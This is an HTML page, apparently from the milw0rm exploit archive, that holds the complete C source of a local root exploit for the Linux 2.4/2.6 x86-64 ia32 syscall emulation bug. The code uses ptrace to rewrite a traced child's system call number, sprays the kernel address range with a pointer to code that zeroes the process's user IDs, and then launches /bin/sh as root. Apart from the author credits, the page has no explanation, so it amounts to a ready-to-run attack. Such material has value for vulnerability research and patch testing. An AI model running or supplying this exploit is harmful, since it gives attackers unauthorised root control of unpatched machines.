<html><head><title>Linux Kernel 2.4/2.6 x86-64 System Call Emulation Exploit</title></head><pre>/*
 * exploit for x86_64 linux kernel ia32syscall emulation
 * bug, discovered by Wojciech Purczynski &lt;cliph_at_isec.pl&gt;
 *
 * by
 * Robert Swiecki &lt;robert_at_swiecki.net&gt;
 * Przemyslaw Frasunek &lt;venglin_at_freebsd.lublin.pl&gt;
 * Pawel Pisarczyk &lt;pawel_at_immos.com.pl&gt;
 * of ATM-Lab http://www.atm-lab.pl
 */

#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;inttypes.h&gt;
#include &lt;sys/reg.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/mman.h&gt;

uint32_t uid, euid, suid;

static void kernelmodecode(void)
{
        int i;
        uint8_t *gs;
        uint32_t *ptr;

        asm volatile (&quot;movq %%gs:(0x0), %0&quot; : &quot;=r&quot;(gs));

        for (i = 200; i &lt; 1000; i+=1) {

                ptr = (uint32_t*) (gs + i);

                if ((ptr[0] == uid) &amp;&amp; (ptr[1] == euid)
                        &amp;&amp; (ptr[2] == suid) &amp;&amp; (ptr[3] == uid)) {
                        ptr[0] = 0; //UID
                        ptr[1] = 0; //EUID
                        ptr[2] = 0; //SUID

                        break;
                }
        }

}

static void docall(uint64_t *ptr, uint64_t size)
{
        getresuid(&amp;uid, &amp;euid, &amp;suid);

        uint64_t tmp = ((uint64_t)ptr &amp; ~0x00000000000FFF);

        if (mmap((void*)tmp, size, PROT_READ|PROT_WRITE|PROT_EXEC,
                MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) == MAP_FAILED) {
                printf(&quot;mmap fault\n&quot;);
                exit(1);
        }

        for (; ptr &lt; (tmp + size); ptr++)
                *ptr = (uint64_t)kernelmodecode;

        __asm__(&quot;\n&quot;
        &quot;\tmovq $0x101, %rax\n&quot;
        &quot;\tint $0x80\n&quot;);

        printf(&quot;UID %d, EUID:%d GID:%d, EGID:%d\n&quot;, getuid(), geteuid(), getgid(), getegid());
        execl(&quot;/bin/sh&quot;, &quot;bin/sh&quot;, 0);
        printf(&quot;no /bin/sh ??\n&quot;);
        exit(0);
}

int main(int argc, char **argv)
{
        int pid, status, set = 0;
        uint64_t rax;
        uint64_t kern_s = 0xffffffff80000000;
        uint64_t kern_e = 0xffffffff84000000;
        uint64_t off = 0x0000000800000101 * 8;

        if (argc == 4) {
                docall((uint64_t*)(kern_s + off), kern_e - kern_s);
                exit(0);
        }

        if ((pid = fork()) == 0) {
                ptrace(PTRACE_TRACEME, 0, 0, 0);
                execl(argv[0], argv[0], &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, 0);
                perror(&quot;exec fault&quot;);
                exit(1);
        }

        if (pid == -1) {
                printf(&quot;fork fault\n&quot;);
                exit(1);
        }

        for (;;) {
                if (wait(&amp;status) != pid)
                        continue;

                if (WIFEXITED(status)) {
                        printf(&quot;Process finished\n&quot;);
                        break;
                }

                if (!WIFSTOPPED(status))
                        continue;

                if (WSTOPSIG(status) != SIGTRAP) {
                        printf(&quot;Process received signal: %d\n&quot;, WSTOPSIG(status));
                        break;
                }

                rax = ptrace(PTRACE_PEEKUSER, pid, 8*ORIG_RAX, 0);
                if (rax == 0x000000000101) {
                        if (ptrace(PTRACE_POKEUSER, pid, 8*ORIG_RAX, off/8) == -1) {
                                printf(&quot;PTRACE_POKEUSER fault\n&quot;);
                                exit(1);
                        }
                        set = 1;
                }

                if ((rax == 11) &amp;&amp; set) {
                        ptrace(PTRACE_DETACH, pid, 0, 0);
                        for(;;)
                                sleep(10000);
                }

                if (ptrace(PTRACE_SYSCALL, pid, 1, 0) == -1) {
                        printf(&quot;PTRACE_SYSCALL fault\n&quot;);
                        exit(1);
                }
        }

        return 0;
}

// milw0rm.com [2007-09-27]</pre></html>